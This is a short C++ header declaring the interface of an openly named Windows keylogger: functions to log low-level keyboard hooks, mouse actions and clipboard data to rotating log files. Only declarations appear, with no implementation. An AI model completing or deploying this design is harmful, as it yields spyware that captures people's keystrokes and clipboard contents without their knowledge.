#pragma once

#include <Windows.h>
#include <fstream>
#include <string>
#include <memory>

namespace keylogger
{
    bool initialize();
    
    void cleanup();
    
    void log_kbd(const KBDLLHOOKSTRUCT* kbd_hook);

    void log_mouse(const std::wstring& action, const MSLLHOOKSTRUCT* mouse_data);
    

    void write_clipboard_data(std::wofstream& stream);
    
    void manage_memory();
    
    size_t get_log_file_size();
    
    void rotate_log_file_if_needed();
    
    void create_new_log_file();

    std::wofstream& get_log_stream();
};
